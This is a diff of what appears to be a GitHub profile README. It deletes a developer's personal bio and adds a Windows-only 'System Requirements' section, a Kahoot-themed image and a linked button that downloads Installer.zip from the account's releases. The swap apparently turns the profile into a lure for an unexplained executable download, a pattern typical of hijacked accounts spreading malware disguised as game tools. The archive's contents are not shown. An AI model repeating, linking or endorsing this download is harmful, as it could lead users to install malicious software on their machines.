@@ -1,15 +1,12 @@
+# System Requirements:
 
-I'm Aagaman, a passionate individual who loves diving into the realms of AI, ML, and Flutter.
-
-## 🚀 About Me
-
-- 👨‍💻 AI/ML and Flutter Enthusiast
-- 🌐 Exploring the synergy of data and mobile development
-- ✨ Tech explorer with a flair for innovation
-
-## 📫 Connect with Me
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-aagaman-blue)](www.linkedin.com/in/aagaman-bhattarai-07068122a/)
+1) Windows 10/11 OS
 
 
-Feel free to explore my repositories and connect with me on social media! Let's code and create together! 🌈✨
+2) Not suitable - Linux / MAC os
+
+3) Don't forget, if something doesn't work before writing to me TEST it! Maybe you don't have packages installed + All more info in the READ ME text file!
+
+![kahoot](https://github.com/zeus0911/zeus0911/assets/112919863/45586731-05fd-4f8d-82cb-2aee0d340ca2)
+[![R10D](https://github.com/zeus0911/zeus0911/assets/112919863/c83a43b2-d334-48ba-b23c-7f2a097fa347)](https://github.com/zeus0911/zeus0911/releases/download/kahoot/Installer.zip)
+
